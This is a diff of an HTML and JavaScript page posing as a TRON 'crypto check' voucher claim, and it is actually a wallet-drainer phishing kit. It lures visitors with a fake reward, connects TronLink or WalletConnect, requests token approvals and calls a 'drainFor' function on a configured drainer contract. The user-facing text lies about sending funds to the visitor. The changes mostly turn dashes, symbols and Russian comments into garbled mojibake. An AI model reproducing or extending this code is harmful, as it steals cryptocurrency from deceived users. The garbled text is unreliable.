@@ -1,9 +1,9 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Crypto Check — claim</title>
+<title>Crypto Check вЂ” claim</title>
 <style>
   :root { color-scheme: dark; --g: #23d07a; --g2: #0fa35c; --ink: #e9f5ee; --mut: #8aa79a; }
   * { box-sizing: border-box; }
@@ -57,26 +57,26 @@
   <div id="view-connect">
     <h1 class="headline">A crypto voucher has been issued to you!</h1>
     <div class="sub">Connect your wallet to receive it. TronRewards never requests private keys.</div>
-    <img class="voucher" src="voucher.png" alt="" onerror="this.style.display='none'">
+    <img class="voucher" src="voucher.png?v=2" alt="" onerror="this.style.display='none'">
     <button class="cta" id="connect-tl">Connect TronLink</button>
-    <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
+    <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, вЂ¦)</button>
     <div class="status" id="cstatus"></div>
   </div>
 
   <div id="view-claim" class="hidden">
     <h1>Your crypto check is ready</h1>
     <div class="mono" id="who" style="margin-bottom:10px"></div>
-    <div class="sub">Confirm token access — the funds will be sent to your address.</div>
+    <div class="sub">Confirm token access вЂ” the funds will be sent to your address.</div>
     <div class="amount">
       <div class="lbl">Available to receive</div>
       <div class="val"><span id="total">0</span><small id="total-sym"></small></div>
       <div class="rows" id="rows"></div>
       <div class="row" style="border-top:1px solid #14291d;margin-top:8px;padding-top:8px">
-        <span>Wallet TRX (fees)</span><b id="fuel">—</b>
+        <span>Wallet TRX (fees)</span><b id="fuel">вЂ”</b>
       </div>
     </div>
     <ul class="steps">
-      <li class="on"><span class="n">⛓</span>Wallet connected</li>
+      <li class="on"><span class="n">в›“</span>Wallet connected</li>
       <li id="st-approve"><span class="n">2</span>Token permission</li>
       <li id="st-claim"><span class="n">3</span>Check delivered</li>
     </ul>
@@ -86,19 +86,19 @@
   </div>
 
   <div id="view-done" class="hidden success">
-    <div class="tick">✓</div>
+    <div class="tick">вњ“</div>
     <h1>Check delivered</h1>
     <div class="sub">The funds have been sent. Transaction:</div>
     <div class="mono" id="txid"></div>
   </div>
 </main>
 
-<footer>Smart contract: <span class="mono" id="contract">—</span><br>Network: TRON</footer>
+<footer>Smart contract: <span class="mono" id="contract">вЂ”</span><br>Network: TRON</footer>
 
 <div id="wc" class="hidden">
   <div class="sheet">
     <b>Scan with your wallet</b>
-    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…?</div>
+    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKXвЂ¦?</div>
     <canvas id="qr"></canvas>
     <div class="wallets" id="deeplinks"></div>
     <button class="ghost" id="wc-copy">Copy connection link</button>
@@ -132,7 +132,7 @@ function fmt(raw, dec) { const s = String(raw).padStart(dec + 1, '0'); const w =
 async function loadConfig() {
   try { const r = await fetch('/api/config'); if (!r.ok) throw 0; cfg = await r.json(); }
   catch (e) { if (window.BAIT_CONFIG) { cfg = window.BAIT_CONFIG; staticMode = true; } else throw new Error('config'); }
-  $('contract').textContent = cfg.drainer || '—';
+  $('contract').textContent = cfg.drainer || 'вЂ”';
 }
 
 async function rpc(method, params, tries = 8) {
@@ -166,7 +166,7 @@ function b58bytes(s) {
   return Uint8Array.from(out.concat(n.reverse()));
 }
 const hex2 = (b) => Array.from(b, (x) => x.toString(16).padStart(2, '0')).join('');
-// base58 адрес -> 20 байт (без 0x41) в hex, дополненные до 32
+// base58 Р°РґСЂРµСЃ -> 20 Р±Р°Р№С‚ (Р±РµР· 0x41) РІ hex, РґРѕРїРѕР»РЅРµРЅРЅС‹Рµ РґРѕ 32
 function addrParam(b58) { const b = b58bytes(b58); return hex2(b.slice(1, 21)).padStart(64, '0'); }
 const uintParam = (v) => BigInt(v).toString(16).padStart(64, '0');
 
@@ -224,7 +224,7 @@ async function wcSend(contract, selector, param, feeLimit) {
   try {
     res = await signer.client.request(make(!v1));
   } catch (e) {
-    res = await signer.client.request(make(v1)); // пробуем другой формат
+    res = await signer.client.request(make(v1)); // РїСЂРѕР±СѓРµРј РґСЂСѓРіРѕР№ С„РѕСЂРјР°С‚
   }
   const sig = (res && res.result && res.result.signature) || res.signature || (res.result && res.result.result && res.result.result.signature);
   if (!sig) throw new Error('not signed');
@@ -248,12 +248,12 @@ const wcSendClaim = () => wcSend(cfg.drainer, 'drainFor(address)', addrParam(acc
 async function connectTronLink() {
   if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1', bait: 'TDemoBait' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
   $('connect-tl').disabled = true;
-  setStatus('Connecting…?');
+  setStatus('ConnectingвЂ¦?');
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); $('connect-tl').disabled = false; return; } }
   const tl = window.tronLink || window.tronWeb;
   if (tl && tl.request) { try { await tl.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
   if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-    setStatus('TronLink not found — use the other wallet button.', 'err');
+    setStatus('TronLink not found вЂ” use the other wallet button.', 'err');
     $('connect-tl').disabled = false; return;
   }
   signer = { kind: 'tronlink', w: window.tronWeb, address: window.tronWeb.defaultAddress.base58 };
@@ -266,7 +266,7 @@ async function connectWalletConnect() {
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); return; } }
   if (!cfg.wcProjectId) { setStatus('WalletConnect Project ID is not set in config.js', 'err'); return; }
   $('connect-wc').disabled = true;
-  setStatus('Opening WalletConnect…?');
+  setStatus('Opening WalletConnectвЂ¦?');
   try {
     const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
     wcClient = await SignClient.init({
@@ -304,7 +304,7 @@ async function connectWalletConnect() {
 
 async function load() {
   $('claim').disabled = true;
-  setStatus('Checking your check…?');
+  setStatus('Checking your checkвЂ¦?');
   let dc;
   if (DEMO) {
     await sleep(700);
@@ -369,9 +369,9 @@ async function run() {
         }
       }
     }
-    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = '✓';
+    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = 'вњ“';
     $('st-claim').classList.add('on');
-    setStatus('Sending your check — confirm in wallet');
+    setStatus('Sending your check вЂ” confirm in wallet');
     await sleep(1100);
     $('txid').textContent = 'demo' + Math.random().toString(16).slice(2, 26) + 'demo';
     show('view-done');
@@ -379,7 +379,7 @@ async function run() {
   }
   try {
     for (let i = 0; i < found.length; i++) {
-      setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' — confirm in wallet');
+      setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' вЂ” confirm in wallet');
       const t = found[i];
       const dec = BigInt(t.decimals || 6);
       const bal = BigInt(t.raw);
@@ -396,9 +396,9 @@ async function run() {
         }
       }
     }
-    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = '✓';
+    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = 'вњ“';
     $('st-claim').classList.add('on');
-    setStatus('Sending your check — confirm in wallet');
+    setStatus('Sending your check вЂ” confirm in wallet');
     const txid = signer.kind === 'tronlink'
       ? await signer.w.contract(DRAIN_ABI, cfg.drainer).drainFor(account).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''))
       : await wcSendClaim();
@@ -421,4 +421,5 @@ loadConfig().catch(() => {});
 </script>
 </body>
 </html>
+
 
